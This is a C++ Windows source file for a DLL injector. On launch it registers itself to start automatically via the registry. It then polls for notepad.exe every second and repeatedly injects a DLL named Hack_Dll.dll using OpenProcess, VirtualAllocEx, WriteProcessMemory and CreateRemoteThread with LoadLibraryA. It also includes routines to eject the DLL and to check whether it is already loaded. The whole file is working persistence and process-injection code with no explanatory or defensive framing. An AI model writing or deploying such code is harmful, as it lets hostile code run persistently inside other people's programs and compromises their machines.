// DLL_INJECTOR.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"
#include <TLHELP32.H>
#include "Logger.h"
#include "RegApp.h"

#define DEF_PROC_NAME ("notepad.exe")
#define INJECT_DLL_NAME ("Hack_Dll.dll")

BOOL DoesFileExist(char* pszFilename);
DWORD FindProcessID(char *szProcessName);
BOOL IsAlreadyInjected(DWORD dwPID, char *szDllName);
BOOL InjectDll(DWORD dwPID, char *szDllName);
BOOL EjectDll(DWORD dwPID, char *szDllName);

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

	//////////////////////////////////// Make app auto start //////////////////////////////////////
	if (!registAppStartup()) {
		printf("Failed to setup app in registry");
	} else {
		printf("Added to registry");
	}
	
	////////////////////////////////////Main Inject!!!//////////////////////////////////////
	DWORD dwPID = 0xFFFFFFFF;
	DWORD dwLen = 256;
	char strPath[256];
	GetCurrentDirectoryA(dwLen, strPath);
	sprintf(strPath, "%s\\%s", strPath, INJECT_DLL_NAME);
	printf("TARGET PROCESS NAME: %s\n", DEF_PROC_NAME);
	printf("INJECT DLL PATH: %s\n", strPath);
	if (!DoesFileExist(strPath)){
		log_inform(L" ********* INJECT-DLL IS NOTHING! **********\n");
		return 0;
	}
	
	printf("FINDING TARGET PROCESS...\n");
	while(TRUE)
	{
		while(dwPID == 0xFFFFFFFF){
			Sleep(1000);
			dwPID = FindProcessID(DEF_PROC_NAME);
		}
		if (!IsAlreadyInjected(dwPID, INJECT_DLL_NAME))
		{
			if (InjectDll(dwPID, strPath))
				log_inform(L" *** DLL INJECTED! ***\n");
			else
				log_error(L" *** DLL INJECTION FAILED! ***\n");
		}
		Sleep(1000);
		dwPID = 0xFFFFFFFF;
	}
	
	return 0;
}

BOOL DoesFileExist(char* pszFilename)
{
    HANDLE hf = CreateFile(pszFilename,
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	
    if (INVALID_HANDLE_VALUE != hf)
    {
        CloseHandle(hf);
        return true;
    }
    else if (GetLastError() == ERROR_SHARING_VIOLATION)
    {
        // should we return 'exists but you can't access it' here?
        return true;
    }
	
    return false;
}

DWORD FindProcessID(char *szProcessName)
{
	DWORD dwPID = 0xFFFFFFFF;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;
	// Get the snapshot of the system
	pe.dwSize = sizeof( PROCESSENTRY32 );
	hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );
	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		if(!_stricmp(pe.szExeFile, szProcessName))
		{
			dwPID = pe.th32ProcessID;
			break;
		}
	}
	while(Process32Next(hSnapShot, &pe));
	CloseHandle(hSnapShot);
	return dwPID;
}

BOOL InjectDll(DWORD dwPID, char *szDllName)
{
	HANDLE hProcess, hThread;
	HMODULE hMod;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = lstrlenA(szDllName) + 1;
	LPTHREAD_START_ROUTINE pThreadProc;
	
	if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
		return FALSE;
	
	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT,
		PAGE_READWRITE);
	
	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, NULL);
	
	hMod = GetModuleHandleA("kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryA");
	
	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return TRUE;
}

BOOL EjectDll(DWORD dwPID, char *szDllName)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot, hProcess, hThread;
	HMODULE hModule = NULL;
	char szModuleNameA[32];
	MODULEENTRY32 me = { sizeof(me) };
	LPTHREAD_START_ROUTINE pThreadProc;
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		memset(szModuleNameA, 0, 32);
		if (!_stricmp(me.szModule, szDllName))
		{
			bFound = TRUE;
			break;
		}
	}
	if (!bFound)
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	
	hModule = GetModuleHandleA("kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
	hThread = CreateRemoteThread(hProcess, NULL, 0,
		pThreadProc, me.modBaseAddr,
		0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);
	return TRUE;
}

BOOL IsAlreadyInjected(DWORD dwPID, char *szDllName)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot;
	HMODULE hModule = NULL;
	char szModuleNameA[32];
	MODULEENTRY32 me = { sizeof(me) };
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		memset(szModuleNameA, 0, 32);
		if (!_stricmp(me.szModule, szDllName))
		{
			bFound = TRUE;
			break;
		}
	}
	CloseHandle(hSnapshot);
	return bFound;
}